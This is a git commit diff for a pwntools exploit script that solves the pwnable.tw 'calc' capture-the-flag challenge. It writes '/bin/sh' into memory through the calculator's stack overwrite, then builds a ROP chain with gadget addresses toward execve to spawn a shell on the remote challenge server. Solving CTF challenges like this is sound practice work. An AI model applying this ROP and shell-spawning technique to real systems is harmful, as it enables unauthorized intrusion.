1f256711a9d386f00bea45cb98486c6e40dab5d9
Lucas <ball.lucas@gmail.com>
2022-02-01 06:25:15 +0000

    solved calc1

--- pwnable/calc/e.py
+++ pwnable/calc/e.py
@@ -2,22 +2,14 @@
 from pwn import *
 import sys
 
-
-# Return address is 0x804967a
 context.terminal = ['tmux', 'splitw', '-h']
 context(arch="i386", log_level="error")
 context.kernel = "i386"
 p = remote("chall.pwnable.tw", 10100)
 #p = process("./calc")
 elf = ELF("./calc")
-rop = ROP("./calc")
-_open = elf.symbols["open"]
 _read = elf.symbols["read"]
-_write = elf.symbols["write"]
-_mprotect = elf.symbols["mprotect"]
 _calc = elf.symbols["calc"]
-print(hex(_open))
-
 
 if "-d" in sys.argv:
     gdb.attach(p,'')
@@ -39,11 +31,8 @@ def sendval(p, i, val):
     p.sendline(p1)
     p.recvline()
 
-rop.call("read", [0, 0x80eb000, 8])
-
 # Location in memory to put "/bin/sh\x00"
 sh = 0x80eb500
-
 
 # First hurdle of putting "/bin/sh\x00" in memory
 p1 = "00+360+" + str(_read)
@@ -64,9 +53,8 @@ p.recvline()
 p.sendline()
 p.send("/bin/sh\x00")
 
-# Now to ROP chain the whole thing
+# Now to ROP chain the whole thing for execve("/bin/sh\x00", 0, 0)
 p_eax_r = 0x805c34b
-#p_ebx_r = 0x80bf782
 p_ecx_ebx_r = 0x80701d1
 
 p1 = "00+360+" + str(p_eax_r)
